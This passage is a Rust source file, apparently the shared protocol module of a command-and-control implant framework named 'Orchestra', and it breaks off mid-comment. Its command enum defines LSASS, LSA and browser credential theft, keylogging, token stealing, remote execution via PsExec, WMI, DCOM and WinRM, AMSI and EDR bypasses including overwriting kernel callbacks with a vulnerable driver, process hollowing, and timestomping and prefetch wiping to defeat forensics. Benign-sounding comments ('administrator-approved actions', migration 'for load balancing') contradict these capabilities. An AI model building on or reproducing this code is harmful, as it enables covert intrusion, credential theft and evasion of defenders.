//! Shared protocol, error, and cryptographic primitives for the Orchestra
//! console <-> agent channel.

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use thiserror::Error;
use zeroize::Zeroize;

/// Length in bytes of the AES-256 key used by [`CryptoSession`].
pub const KEY_LEN: usize = 32;
/// Length in bytes of the HKDF salt prepended to each encrypted message.
pub const SALT_LEN: usize = 32;
/// Length in bytes of the AES-GCM nonce prepended to each ciphertext.
pub const NONCE_LEN: usize = 12;

/// Wire-protocol version for the agent ↔ server channel.
///
/// Bump this whenever a breaking change is made to the [`Message`] encoding or
/// the connection-establishment sequence.  The agent sends a
/// [`Message::VersionHandshake`] as its first message and refuses to proceed
/// if the server's echo carries a different version.
///
/// Version 2 prefixes encrypted payloads with a per-session HKDF salt:
/// `salt(32) || nonce(12) || ciphertext_with_tag`.
pub const PROTOCOL_VERSION: u32 = 2;

/// Audit event logging for operator actions and agent state changes.
pub mod audit;
/// Agent and server configuration structures (TOML deserialization).
pub mod config;
/// X25519 forward-secrecy key exchange for session establishment.
pub mod forward_secrecy;
/// Indicator-of-compromise detection and reporting.
pub mod ioc;
/// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
pub mod normalized_transport;
/// P2P mesh protocol message types and link management.
pub mod p2p_proto;
/// TLS transport configuration and certificate handling.
pub mod tls_transport;
/// Malleable C2 profile types shared between agent and server.
pub mod malleable_types;

pub use audit::{AuditEvent, Outcome};

/// Top-level wire message exchanged between a console and an agent.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Message {
    /// First message exchanged on every new connection.
    ///
    /// The agent sends this before the registration [`Heartbeat`]; the server
    /// echoes back its own version.  Either side SHOULD log a warning and MAY
    /// close the connection when the received version differs from
    /// [`PROTOCOL_VERSION`].
    VersionHandshake {
        version: u32,
    },
    Heartbeat {
        timestamp: u64,
        agent_id: String,
        status: String,
    },
    TaskRequest {
        task_id: String,
        command: Command,
        /// Identity of the operator who issued the command. Populated by the
        /// Control Center from the authenticated API session; agents use it
        /// to attribute `AuditEvent` records rather than defaulting to
        /// `"admin"`.  `None` means the request came directly from a
        /// console without an operator identity (e.g. integration tests).
        #[serde(default)]
        operator_id: Option<String>,
    },
    TaskResponse {
        task_id: String,
        result: Result<String, String>,
        /// Optional binary result data from `ExecutePluginBinary`.
        /// `None` for all other command responses.
        #[serde(default)]
        result_data: Option<Vec<u8>>,
    },
    /// Push a signed, AES-GCM-encrypted capability module to the agent.
    /// `encrypted_blob` is the same wire format produced by
    /// `CryptoSession::encrypt`.
    ModulePush {
        module_name: String,
        version: String,
        encrypted_blob: Vec<u8>,
    },
    /// Agent reports the SHA-256 hash of its `.text` section after a morph
    /// operation.  Sent both in response to `MorphNow` (carried in
    /// `TaskResponse.result`) and proactively after the initial check-in
    /// morph triggered by the server-supplied seed.
    MorphResult {
        connection_id: String,
        text_hash: String,
    },
    AuditLog(AuditEvent),
    Shutdown,
    /// Agent requests a capability module by ID.  The server locates the
    /// module file on disk, signs and encrypts it, and replies with a
    /// [`ModuleResponse`].  This replaces the legacy direct-HTTP download
    /// path (`reqwest::get`) so that module transfer is tunnelled through
    /// the encrypted C2 channel.
    ModuleRequest {
        module_id: String,
    },
    /// Server delivers a signed, AES-GCM-encrypted module to the agent in
    /// response to a [`ModuleRequest`].  The `encrypted_blob` has the same
    /// wire format as [`ModulePush::encrypted_blob`] and can be fed directly
    /// to `module_loader::load_plugin`.
    ModuleResponse {
        module_id: String,
        encrypted_blob: Vec<u8>,
    },
    /// P2P mesh: a parent agent forwards C2 traffic on behalf of a child.
    ///
    /// `child_link_id` identifies the originating child in the parent's link
    /// table so the server can route the response back to the correct child.
    /// `data` is the **plaintext** C2 payload (e.g. a serialized
    /// `TaskResponse`) that the child intended for the server.  The C2
    /// transport layer encrypts the entire `Message` (including this variant)
    /// with the parent's AES-256-GCM session key before transmission, so
    /// `data` is encrypted in transit without requiring a separate encryption
    /// step.
    P2pForward {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh: the server sends C2 traffic addressed to a specific child
    /// through its parent.  The parent looks up `child_link_id` in its link
    /// table, re-encrypts `data` with the child's per-link ChaCha20-Poly1305
    /// key, and forwards it as a `DataForward` P2P frame.
    P2pToChild {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh topology report.  Sent periodically by each agent to its
    /// parent (or directly to the server if the agent has no parent).
    /// Contains the agent's current set of child links so the server can
    /// maintain a full mesh topology map.
    P2pTopologyReport {
        agent_id: String,
        children: Vec<P2pChildInfo>,
    },
    /// P2P mesh link failure report.  Sent by an agent to the server when
    /// a P2P link transitions to `Dead` state.  Contains quality metrics
    /// captured at the time of failure for server-side mesh monitoring.
    P2pLinkFailureReport {
        agent_id: String,
        dead_peer_id: String,
        link_type: u8,
        uptime_secs: u64,
        latency_ms: u32,
        packet_loss: f32,
        bandwidth_bps: u64,
    },
    /// Enhanced P2P mesh topology report.  Sent every 120 seconds by each
    /// agent, includes all connected peers (parent/child/lateral) with
    /// link quality metrics and a routing table summary.
    P2pEnhancedTopologyReport {
        agent_id: String,
        /// All connected peers with link type and quality.
        peers: Vec<P2pPeerInfo>,
        /// Reachable destinations with hop counts.
        routes: Vec<P2pRouteInfo>,
    },
    /// A mesh-routed frame exceeded the maximum relay depth.  Sent by
    /// the detecting agent back toward the origin (or server).
    P2pRouteTooDeep {
        destination: String,
        origin: String,
        hop_count: u8,
    },
    /// Server delivers a mesh certificate to the agent during check-in or
    /// renewal.  The agent stores this certificate and presents it during
    /// every P2P link handshake.
    MeshCertificateIssuance {
        certificate: MeshCertificate,
    },
    /// Agent requests a mesh certificate renewal from the server (typically
    /// 2 hours before expiry).
    MeshCertificateRenewal,
    /// Server broadcasts a certificate revocation to all agents.  Every agent
    /// checks its active links and terminates any connection to the revoked peer.
    MeshCertificateRevocation {
        revoked_agent_id_hash: [u8; 32],
    },
    /// Agent reports to the server that a peer has been quarantined due to
    /// suspicious behaviour (invalid cert, compromise indicators, etc.).
    MeshQuarantineReport {
        quarantined_agent_id_hash: [u8; 32],
        reason: u8,
        evidence_hash: [u8; 32],
    },
    /// Interactive shell output — an asynchronous event sent by the agent's
    /// background reader thread whenever a shell session produces stdout or
    /// stderr data.  Unlike `TaskResponse`, this is not correlated to a
    /// specific task ID; it streams continuously until the shell session
    /// is closed.  The server forwards these events to the operator's
    /// console in real-time.
    ShellOutput {
        /// The session that produced this output.
        session_id: u32,
        /// UTF-8 text (lossy-decoded from raw bytes).
        data: String,
        /// Which stream the data came from.
        stream: ShellStream,
    },
}

/// Which stream a [`Message::ShellOutput`] event came from.
#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum ShellStream {
    /// Standard output.
    Stdout = 0,
    /// Standard error.
    Stderr = 1,
}

/// Metadata returned when a shell session is created or listed.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ShellInfo {
    /// Unique session identifier (monotonically increasing).
    pub session_id: u32,
    /// Shell type (e.g. "cmd.exe", "/bin/sh").
    pub shell_type: String,
    /// Epoch timestamp (seconds) when the session was created.
    pub created_at: u64,
    /// Process ID of the child shell.
    pub pid: u32,
}

/// A single child entry in a [`Message::P2pTopologyReport`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pChildInfo {
    pub link_id: u32,
    pub agent_id: String,
}

/// A single peer entry in a [`Message::P2pEnhancedTopologyReport`].
/// Contains the peer's agent_id, link type, quality score, and latency.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pPeerInfo {
    pub peer_id: String,
    /// 0=parent, 1=child, 2=peer (lateral).
    pub link_type: u8,
    /// Composite quality score (0.0–1.0).
    pub quality: f32,
    /// Last measured latency in milliseconds.
    pub latency_ms: u32,
}

/// A routing summary entry in a [`Message::P2pEnhancedTopologyReport`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pRouteInfo {
    pub destination: String,
    pub hop_count: u8,
}

/// A mesh certificate issued by the Orchestra server, used for P2P link
/// authentication.  Each agent receives a certificate during check-in and
/// presents it during the P2P handshake.  The Ed25519 signature is computed
/// over the concatenation:
///
/// ```text
/// agent_id_hash(32) || public_key(32) || issued_at_le(8) || expires_at_le(8)
/// ```
///
/// Optional compartment tag restricts peer links to agents in the same
/// compartment.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct MeshCertificate {
    /// SHA-256 hash of the agent's `agent_id` string (used for revocation
    /// lookups without revealing the plaintext ID on the wire).
    pub agent_id_hash: [u8; 32],
    /// The agent's long-term Ed25519 public key for link authentication.
    pub public_key: [u8; 32],
    /// Unix timestamp (seconds) when the certificate was issued.
    pub issued_at: u64,
    /// Unix timestamp (seconds) when the certificate expires.
    pub expires_at: u64,
    /// Ed25519 signature over the certificate body, produced by the server's
    /// `module_signing_key`.
    #[serde(
        serialize_with = "serialize_sig_64",
        deserialize_with = "deserialize_sig_64"
    )]
    pub server_signature: [u8; 64],
    /// Optional mesh compartment identifier.  When set, the agent may only
    /// establish peer links with agents in the same compartment.
    #[serde(default)]
    pub compartment: Option<String>,
}

/// Serde helper: serialize a 64-byte Ed25519 signature as a byte array.
fn serialize_sig_64<S: serde::Serializer>(sig: &[u8; 64], s: S) -> Result<S::Ok, S::Error> {
    s.serialize_bytes(sig)
}

/// Serde helper: deserialize a 64-byte Ed25519 signature from a byte array.
fn deserialize_sig_64<'de, D: serde::Deserializer<'de>>(d: D) -> Result<[u8; 64], D::Error> {
    struct SigVisitor;
    impl<'de> serde::de::Visitor<'de> for SigVisitor {
        type Value = [u8; 64];
        fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
            f.write_str("a 64-byte signature")
        }
        fn visit_bytes<E: serde::de::Error>(self, v: &[u8]) -> Result<Self::Value, E> {
            v.try_into().map_err(|_| E::invalid_length(v.len(), &self))
        }
        fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<Self::Value, A::Error> {
            let mut buf = [0u8; 64];
            for (i, slot) in buf.iter_mut().enumerate() {
                *slot = seq.next_element()?.ok_or_else(|| {
                    serde::de::Error::invalid_length(i, &self)
                })?;
            }
            Ok(buf)
        }
    }
    d.deserialize_bytes(SigVisitor)
}

impl MeshCertificate {
    /// Return the canonical byte buffer that is signed / verified:
    /// `agent_id_hash || public_key || issued_at_le || expires_at_le`.
    pub fn signing_input(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(32 + 32 + 8 + 8);
        buf.extend_from_slice(&self.agent_id_hash);
        buf.extend_from_slice(&self.public_key);
        buf.extend_from_slice(&self.issued_at.to_le_bytes());
        buf.extend_from_slice(&self.expires_at.to_le_bytes());
        buf
    }

    /// Check whether the certificate has expired relative to `now` (Unix ts).
    pub fn is_expired(&self, now: u64) -> bool {
        now >= self.expires_at
    }

    /// Check whether the certificate is within the renewal window.
    pub fn needs_renewal(&self, now: u64) -> bool {
        let renewal_threshold = self
            .expires_at
            .saturating_sub(crate::p2p_proto::MESH_CERT_RENEWAL_SECS);
        now >= renewal_threshold
    }
}

/// Compute the SHA-256 hash of an agent_id string (used for revocation and
/// certificate identity).
pub fn hash_agent_id(agent_id: &str) -> [u8; 32] {
    use sha2::Digest;
    let mut hasher = Sha256::new();
    hasher.update(agent_id.as_bytes());
    hasher.finalize().into()
}

/// Verify a mesh certificate's Ed25519 signature and expiry.
///
/// Returns `Ok(())` if the signature is valid and the certificate has not
/// expired relative to `now` (Unix timestamp in seconds).  Returns `Err`
/// with a human-readable description otherwise.
///
/// This function is only available when the `module-signatures` feature is
/// enabled (which pulls in `ed25519-dalek`).
#[cfg(feature = "module-signatures")]
pub fn verify_mesh_certificate(
    cert: &MeshCertificate,
    server_public_key: &[u8; 32],
    now: u64,
) -> Result<(), String> {
    use ed25519_dalek::{Signature, Verifier, VerifyingKey};

    // Check expiry first.
    if cert.is_expired(now) {
        return Err("mesh certificate has expired".to_string());
    }

    // Verify the agent_id_hash matches — this is a sanity check ensuring
    // the cert struct is internally consistent.
    // (The caller typically already knows the agent_id and can verify separately.)

    // Reconstruct the Ed25519 verifying key from bytes.
    let verifying_key = VerifyingKey::from_bytes(server_public_key)
        .map_err(|e| format!("invalid server public key: {e}"))?;

    // Reconstruct the signature from bytes.
    let signature = Signature::from_bytes(&cert.server_signature);

    // Verify the signature over the canonical signing input.
    verifying_key
        .verify(&cert.signing_input(), &signature)
        .map_err(|e| format!("mesh certificate signature verification failed: {e}"))?;

    Ok(())
}

/// The set of administrator-approved actions the agent is willing to perform.
///
/// The protocol intentionally does **not** expose an "execute arbitrary shell
/// command" variant. Scripts must be pre-registered on the endpoint and are
/// referenced by name via [`Command::RunApprovedScript`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Command {
    Ping,
    GetSystemInfo,
    /// Run a script that has been pre-registered with the agent. `script` is
    /// the registered identifier, **not** an arbitrary command line.
    RunApprovedScript {
        script: String,
    },
    ListDirectory {
        path: String,
    },
    ReadFile {
        path: String,
    },
    WriteFile {
        path: String,
        content: Vec<u8>,
    },
    DeployModule {
        module_id: String,
    },
    ExecutePlugin {
        plugin_id: String,
        args: String,
    },
    Shutdown,
    DiscoverNetwork,
    CaptureScreen,
    SimulateKey {
        key: String,
    },
    SimulateMouse {
        x: i32,
        y: i32,
    },
    StartHciLogging,
    StopHciLogging,
    GetHciLogBuffer,
    ReloadConfig,
    /// Install the opt-in persistence service (systemd unit / scheduled task).
    EnablePersistence,
    /// Remove the persistence service installed by `EnablePersistence`.
    DisablePersistence,
    /// Move the agent into the address space of `target_pid` for load
    /// balancing or resource consolidation.
    MigrateAgent {
        target_pid: u32,
    },
    /// Return a JSON-serialized snapshot of running processes.
    ListProcesses,
    /// Set the seed used for periodic self-re-encoding of the agent's own
    /// `.text` section.  The seed is combined with a timestamp to derive a
    /// unique transformation on each re-encoding pass.  Only effective when
    /// the `self-reencode` feature is compiled in.
    SetReencodeSeed {
        seed: u64,
    },
    /// Immediately re-encode the agent's `.text` section with the supplied
    /// seed and report a SHA-256 hash of the new `.text` section back to
    /// the server.  Unlike `SetReencodeSeed` (which only stores the seed for
    /// the next periodic cycle), `MorphNow` triggers a synchronous
    /// transformation and returns the resulting hash in the `TaskResponse`.
    MorphNow {
        seed: u64,
    },
    /// Switch the sleep obfuscation variant at runtime.  Accepted values:
    /// `"cronus"` (waitable-timer-based) or `"ekko"` (NtDelayExecution-based).
    /// The change takes effect on the next sleep cycle.
    SetSleepVariant {
        variant: String,
    },
    /// Return a JSON array of metadata for all loaded plugins.
    ListPlugins,
    /// Remove a plugin from the loaded-plugin registry and release its resources.
    UnloadPlugin {
        plugin_id: String,
    },
    /// Return the full `PluginMetadata` for a specific loaded plugin.
    GetPluginInfo {
        plugin_id: String,
    },
    /// Download a module from the configured `module_repo_url` or a specified
    /// URL, store it in the cache directory, and optionally load it.
    DownloadModule {
        module_id: String,
        repo_url: Option<String>,
    },
    /// Execute a loaded plugin using the binary I/O path.  Returns raw bytes
    /// via `TaskResponse.result_data`.
    ExecutePluginBinary {
        plugin_id: String,
        input_data: Vec<u8>,
    },
    /// Query the status of an asynchronous plugin job.
    JobStatus {
        job_id: String,
    },

    // ── Token Manipulation (Windows only) ───────────────────────────────

    /// Create a new logon session with the provided credentials.
    /// Returns the new session's token handle information on success.
    MakeToken {
        username: String,
        password: String,
        domain: String,
        logon_type: u32,
    },
    /// Duplicate an existing process token via `OpenProcessToken` +
    /// `DuplicateTokenEx` and begin impersonating it.
    StealToken {
        target_pid: u32,
    },
    /// Revert to the original process token (undo `StealToken` / `MakeToken`).
    Rev2Self,
    /// Elevate to SYSTEM privileges via token impersonation (steal from a
    /// SYSTEM-owned process such as `winlogon.exe` or `lsass.exe`).
    GetSystem,

    // ── Lateral Movement (Windows only) ─────────────────────────────────

    /// Execute a command on a remote host via PsExec-style service creation.
    PsExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WMI `IWbemServices`.
    WmiExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via DCOM (`ShellWindows` /
    /// `ShellBrowserWindow` COM object).
    DcomExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WinRM SOAP requests.
    WinRmExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    // ── P2P mesh management ────────────────────────────────────────────────
    /// Instruct a child agent to establish a P2P link to a parent agent.
    LinkAgents {
        parent_agent_id: String,
        child_agent_id: String,
        /// Transport to use: `"smb"` or `"tcp"`.
        transport: String,
        /// Target address for TCP links (host:port).  Ignored for SMB.
        #[serde(default)]
        target_addr: String,
    },
    /// Instruct an agent to disconnect from its P2P parent.
    UnlinkAgent {
        agent_id: String,
    },
    /// Return the full P2P mesh topology visible to this agent.
    ListTopology,
    // ── Agent-side P2P link management ─────────────────────────────────────
    /// Connect to a parent agent at the given address using the specified
    /// transport (`"tcp"` or `"smb"`).
    LinkTo {
        parent_addr: String,
        transport: String,
    },
    /// Disconnect from a P2P link.  `None` means disconnect from all links.
    Unlink {
        link_id: Option<u32>,
    },
    /// Report the current P2P links on this agent.
    ListLinks,
    // ── Mesh controller commands ───────────────────────────────────────────
    /// Tell agent A to establish a peer link with agent B.
    MeshConnect {
        target_agent_id: String,
        transport: String,
        target_addr: String,
    },
    /// Tell agent A to close its link with agent B.
    MeshDisconnect {
        target_agent_id: String,
    },
    /// Emergency kill switch: terminate ALL P2P links immediately, purge the
    /// mesh routing table, and refuse new links until cleared.  Sent by the
    /// server when a severe compromise is detected.
    MeshKillSwitch,
    /// Operator-initiated quarantine: the agent must immediately terminate
    /// any link to the specified peer, mark it as quarantined, and refuse
    /// future connections from it.
    MeshQuarantine {
        target_agent_id: String,
        /// Reason code (see `common::p2p_proto::quarantine_reason`).
        reason: u8,
    },
    /// Clear the quarantine flag for an agent, allowing it to reconnect.
    MeshClearQuarantine {
        target_agent_id: String,
    },
    /// Set or change the mesh compartment for this agent.  Affects which
    /// peers are allowed for new link establishment.
    MeshSetCompartment {
        compartment: String,
    },

    // ── In-process .NET assembly execution (Windows only) ──────────────────
    /// Load and execute a .NET assembly entirely in-process using the CLR
    /// hosting APIs (ICLRMetaHost → ICLRRuntimeHost).  Equivalent to
    /// Cobalt Strike's `execute-assembly`.  The assembly bytes must be a
    /// valid .NET PE (managed DLL or EXE).  Output is captured via pipe
    /// redirection and returned as UTF-8 text.
    ExecuteAssembly {
        /// Raw bytes of the .NET assembly (PE/COFF with CLR header).
        data: Vec<u8>,
        /// Command-line arguments passed to the assembly entry point.
        #[serde(default)]
        args: Vec<String>,
        /// Optional wall-clock timeout in seconds.  If the assembly does
        /// not return within this period the CLR thread is terminated.
        /// `None` means use a default (30 s).
        #[serde(default)]
        timeout_secs: Option<u64>,
    },

    // ── BOF / COFF loader (Windows only) ───────────────────────────────────
    /// Execute a Beacon Object File (BOF) / COFF object file in-process.
    /// Compatible with the public BOF ecosystem (trustedsec, CCob, etc.).
    /// The COFF bytes must contain a `go` entry-point symbol.  External
    /// symbols are resolved via the Beacon-compatible API (`DLL$Function`
    /// pattern).  Output is captured via the BeaconOutput callback and
    /// returned as UTF-8 text.
    ExecuteBOF {
        /// Raw bytes of the COFF object file (`.o` / `.obj`).
        data: Vec<u8>,
        /// Arguments packed as length-prefixed blobs and passed to the
        /// `go(char* args, int len)` entry point.
        #[serde(default)]
        args: Vec<String>,
        /// Optional wall-clock timeout in seconds.  If the BOF does not
        /// return within this period the execution thread is terminated.
        /// `None` means use a default (60 s).
        #[serde(default)]
        timeout_secs: Option<u64>,
    },

    // ── Interactive shell sessions ──────────────────────────────────────
    /// Create a new interactive shell session.  Spawns a child process
    /// (cmd.exe, /bin/sh, or a custom shell) with piped stdin/stdout/stderr.
    /// A background reader thread streams output asynchronously via
    /// [`Message::ShellOutput`].
    CreateShell {
        /// Optional path to the shell binary.  `None` uses the platform
        /// default (`cmd.exe` on Windows, `/bin/sh` on Unix).
        #[serde(default)]
        shell_path: Option<String>,
    },
    /// Send input to an active shell session's stdin pipe.
    ShellInput {
        /// The session to send input to.
        session_id: u32,
        /// The text to write.  A newline is appended automatically if not
        /// present.
        data: String,
    },
    /// Close and clean up a shell session (terminate process, close pipes,
    /// stop reader thread).
    ShellClose {
        /// The session to close.
        session_id: u32,
    },
    /// List all active shell sessions with their metadata.
    ShellList,
    /// Resize the pseudo-terminal for a shell session (no-op on Windows
    /// cmd.exe; sets TTY window size on Unix).
    ShellResize {
        /// The session to resize.
        session_id: u32,
        /// Terminal width in columns.
        cols: u16,
        /// Terminal height in rows.
        rows: u16,
    },

    // ── Surveillance ────────────────────────────────────────────────────

    /// Capture a screenshot of the specified monitor (or primary if `None`).
    /// Returns base64-encoded PNG bytes in the task response.
    Screenshot {
        /// Monitor index.  `None` captures the primary display.
        #[serde(default)]
        monitor: Option<u32>,
    },
    /// Start the keylogger.  Keystrokes are buffered in an encrypted ring
    /// buffer and can be retrieved with `KeyloggerDump`.
    KeyloggerStart,
    /// Dump the encrypted keylogger buffer.  Returns `nonce(12) || ciphertext`
    /// containing the recorded keystroke entries.
    KeyloggerDump {
        /// If true, clear the buffer after reading.
        #[serde(default)]
        clear: bool,
    },
    /// Stop the keylogger and release the keyboard hook.
    KeyloggerStop,
    /// Start monitoring the clipboard for changes.  Clipboard content
    /// snapshots are buffered in an encrypted ring buffer.
    ClipboardMonitorStart {
        /// Polling interval in milliseconds.  `None` uses the default (1 000 ms).
        #[serde(default)]
        interval_ms: Option<u64>,
    },
    /// Dump the encrypted clipboard monitor buffer.
    ClipboardMonitorDump {
        /// If true, clear the buffer after reading.
        #[serde(default)]
        clear: bool,
    },
    /// Stop the clipboard monitor.
    ClipboardMonitorStop,
    /// Perform a one-shot clipboard read.  Returns the current clipboard
    /// text as a UTF-8 string.
    ClipboardGet,

    // ── Browser stored-data recovery (Windows) ─────────────────────────

    /// Recover stored credentials and/or cookies from installed browsers.
    /// Windows-only; handled by the `browser-data` feature.
    /// Returns a JSON-encoded `BrowserDataResult` in the response payload.
    BrowserData {
        /// Which browser(s) to target.  `None` defaults to `BrowserType::All`.
        #[serde(default)]
        browser: Option<BrowserType>,
        /// Which data category to collect.
        data_type: BrowserDataType,
    },

    // ── LSASS credential harvesting (Windows only) ──────────────────────

    /// Harvest credentials from LSASS process memory via incremental reading
    /// and in-process parsing.  No dump file is created on disk.  Returns a
    /// JSON-encoded credential list containing MSV (NT hashes), WDigest
    /// (plaintext), Kerberos tickets, DPAPI backup keys, and DCC2 hashes.
    HarvestLSASS,

    // ── LSA Whisperer — SSP interface credential extraction (Windows) ─

    /// Extract credentials by interacting with LSA authentication packages
    /// (SSPs) through their documented interfaces.  Operates entirely within
    /// the LSA process's own security context without reading LSASS memory.
    /// Bypasses Credential Guard and RunAsPPL.  Three methods:
    /// - `Untrusted`: LsaConnectUntrusted (no admin required)
    /// - `SspInject`: Inject custom SSP to capture future logons (admin)
    /// - `Auto`: Try SspInject if elevated, else Untrusted
    HarvestLSA {
        method: LsaMethod,
    },

    /// Return a JSON status snapshot of the LSA Whisperer subsystem:
    /// active method, credentials buffered, SSP injection state, etc.
    LSAWhispererStatus,

    /// Stop the LSA Whisperer: cancel any in-progress SSP enumeration,
    /// unload injected SSP (if any), and clear the credential buffer.
    LSAWhispererStop,

    // ── NTDLL unhooking (Windows) ──────────────────────────────────────

    /// Re-fetch a clean copy of ntdll.dll from \KnownDlls (or disk fallback)
    /// and overlay the .text section onto the in-memory (potentially hooked)
    /// ntdll.  This is the fallback when Halo's Gate fails (all adjacent
    /// syscall stubs are hooked).  Also callable on-demand by the operator.
    UnhookNtdll,

    // ── AMSI bypass mode selection (Windows) ───────────────────────────

    /// Switch the active AMSI bypass strategy at runtime.  The agent will
    /// disable any running bypass and activate the selected one.
    AmsiBypassMode {
        mode: AmsiBypassMode,
    },

    // ── Evanesco continuous memory hiding (Windows) ────────────────────

    /// Return a JSON status snapshot of the Evanesco page-tracker subsystem:
    /// number of tracked pages, current counts by state (encrypted / decrypted),
    /// idle threshold, scan interval, and total encrypt/decrypt call counts.
    /// Only available when the `evanesco` feature is compiled in.
    EvanescoStatus,
    /// Dynamically adjust the idle threshold (in milliseconds) for the
    /// Evanesco background re-encryption thread.  Pages idle longer than
    /// this value are re-encrypted to `PAGE_NOACCESS`.
    EvanescoSetThreshold {
        idle_ms: u64,
    },

    // ── Kernel callback overwrite (BYOVD, Windows only) ───────────────

    /// Discover and report all registered EDR kernel callbacks: process
    /// creation, thread creation, image load, and object manager callbacks.
    /// Returns a JSON array of discovered callbacks with module, address,
    /// and callback block information.
    KernelCallbackScan,

    /// Deploy a vulnerable signed driver (BYOVD), locate EDR kernel callbacks,
    /// and surgically overwrite their function pointers to point to a `ret`
    /// instruction.  The pointer remains non-NULL, defeating EDR integrity
    /// checks, but the callback immediately returns without executing.
    /// Optional `drivers` list restricts which vulnerable drivers to attempt;
    /// empty vector means try all embedded drivers.
    KernelCallbackNuke {
        #[serde(default)]
        drivers: Vec<String>,
    },

    /// Restore all previously overwritten kernel callback pointers to their
    /// original values (from the saved backup).  Requires a prior successful
    /// `KernelCallbackNuke` operation in the current session.
    KernelCallbackRestore,

    // ── EDR bypass transformation engine ────────────────────────────────

    /// Scan the agent's own `.text` section for byte signatures known to be
    /// detected by EDR (YARA rules, entropy heuristics, known gadget chains
    /// like direct syscall stubs).  Returns a JSON array of `SignatureHit`
    /// objects describing each detected pattern with offset, signature name,
    /// and surrounding context bytes.
    EvasionTransformScan,

    /// Run one cycle of the automated EDR bypass transformation engine.
    /// Scans `.text` for known signatures and applies up to
    /// `max_transforms_per_cycle` semantic-preserving transformations
    /// (instruction substitution, register reassignment, nop sled insertion,
    /// constant splitting, jump obfuscation).  Returns a JSON summary of
    /// applied transforms with before/after hashes for verification.
    EvasionTransformRun,

    /// Perform NTFS transaction-based process hollowing injection.
    /// Creates an NTFS transaction, creates a section backed by the
    /// transaction, writes the payload into a suspended target process,
    /// then rolls back the transaction so the on-disk file never existed.
    /// The section mapping in the target process remains valid.
    /// Includes ETW blinding with spoofed provider GUIDs.
    /// Returns `InjectionResult` on success.
    TransactedHollow {
        /// Process name to inject into (e.g. `"svchost.exe"`).
        target_process: String,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Whether to perform ETW blinding before injection.
        etw_blinding: bool,
    },

    /// Delayed module-stomp injection: load a sacrificial DLL into the
    /// target process, wait for the EDR initial-scan window to pass,
    /// then overwrite the DLL's `.text` section with the payload.
    /// The delay (8–15 seconds randomized by default) defeats timing-
    /// based EDR heuristics that flag modules whose code changes shortly
    /// after loading.  Phase 1 (load) returns immediately; Phase 2
    /// (stomp + execute) fires after the delay.
    /// Returns a phase-1 acknowledgement immediately, then a second
    /// `InjectionResult` when phase 2 completes.
    DelayedStomp {
        /// Target process ID.
        target_pid: u32,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Optional override for the delay in seconds (uses config default if `None`).
        delay_secs: Option<u32>,
    },

    // ── Syscall emulation control (Windows only) ─────────────────────────

    /// Toggle user-mode NT kernel interface emulation at runtime.
    /// When enabled, the agent routes configured Nt* calls through
    /// kernel32/advapi32 equivalents instead of ntdll syscall stubs,
    /// making it invisible to EDR hooks on ntdll.  The change takes
    /// effect immediately for subsequent operations.
    SyscallEmulationToggle {
        /// `true` to enable emulation, `false` to disable (revert to
        /// indirect syscalls for all calls).
        enabled: bool,
    },

// ── CET / Shadow Stack bypass (Windows only) ─────────────────────────

    /// Query the current CET (Control-flow Enforcement Technology) /
    /// shadow-stack status on the agent host.  Returns a JSON object
    /// describing whether CET is present, enabled, and which bypass
    /// strategy is active.
    CetStatus,

// ── Token-only impersonation (Windows only) ──────────────────────────

    /// Create a named pipe and impersonate the security context of the
    /// first connecting client using token-only impersonation (avoids
    /// `ImpersonateNamedPipeClient` on the main thread).  The pipe is
    /// created with a randomised suffix if not provided.  Returns the
    /// pipe path and the impersonated user/domain on success.
    ImpersonatePipe {
        /// Named pipe path (e.g. `\\.\pipe\status`).  If empty, a random
        /// pipe name is generated.
        pipe_name: String,
    },
    /// Revert the current thread's impersonation token, restoring the
    /// original process security context.  Does NOT close cached tokens
    /// — call `ListTokens` to inspect and release cached entries.
    RevertToken,
    /// List all cached impersonation tokens with their source, user,
    /// domain, and SID.  Returns a JSON array of token metadata.
    ListTokens,

// ── Forensic cleanup — Prefetch evidence removal (Windows only) ──────

    /// Clean Windows Prefetch (.pf) evidence for the specified executable
    /// name.  If `exe_name` is empty, cleans all .pf files.  The cleanup
    /// method (delete, patch, disable-service) is determined by config.
    CleanPrefetch {
        /// Executable name to clean (e.g. "cmd.exe").  If empty, all .pf
        /// files are cleaned.
        exe_name: String,
    },
    /// Disable the Windows Prefetch service by setting the EnablePrefetcher
    /// registry value to 0.  Returns the original value for later restore.
    DisablePrefetch,
    /// Restore the Windows Prefetch service to its original state (sets
    /// EnablePrefetcher back to the value captured by `DisablePrefetch`).
    RestorePrefetch,

    /// Synchronise MFT timestamps ($SI + $FN) for the specified file to
    /// match the timestamps of a reference file.  Sets all 8 NTFS
    /// timestamps (4 in $STANDARD_INFORMATION + 4 in $FILE_NAME) to a
    /// consistent "cover time" to prevent forensic timeline analysis.
    Timestomp {
        /// Path to the file whose timestamps should be modified.
        file_path: String,
        /// Path to the reference file whose timestamps to copy.  If empty,
        /// uses the configured default reference file (typically ntdll.dll).
        reference_file: String,
    },
    /// Synchronise MFT timestamps for all files in a directory to match
    /// the timestamps of a reference file.  Recursively processes all
